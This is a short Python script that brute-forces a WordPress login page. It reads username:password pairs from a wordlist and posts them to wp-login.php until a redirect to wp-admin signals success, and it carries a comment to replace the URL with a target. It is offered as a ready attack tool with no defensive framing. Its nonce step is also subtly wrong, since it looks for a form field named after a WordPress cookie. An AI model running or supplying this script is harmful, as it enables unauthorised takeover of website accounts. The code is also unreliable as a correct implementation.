import requests
from bs4 import BeautifulSoup

# Function to extract the nonce value from the login page
def get_nonce(url):
    response = requests.get(url)
    soup = BeautifulSoup(response.content, 'html.parser')
    nonce = soup.find('input', {'name': 'wordpress_logged_in'})['value']
    return nonce

# Function to perform the brute-force attack
def brute_force(url, username, password, nonce):
    login_data = {
        'log': username,
        'pwd': password,
        'wp-submit': 'Log In',
        'redirect_to': url,
        'testcookie': '1',
        'wordpress_logged_in': nonce
    }
    response = requests.post(url, data=login_data)
    if 'wp-admin' in response.url:
        print(f"Success! Username: {username}, Password: {password}")
        return True
    else:
        print(f"Failed! Username: {username}, Password: {password}")
        return False

# Main function
def main():
    url = 'http://example.com/wp-login.php'  # Replace with the target URL
    wordlist_path = 'wordlist.txt'  # Path to the wordlist file

    with open(wordlist_path, 'r') as file:
        lines = file.readlines()

    for line in lines:
        username, password = line.strip().split(':')
        nonce = get_nonce(url)
        if brute_force(url, username, password, nonce):
            break

if __name__ == '__main__':
    main()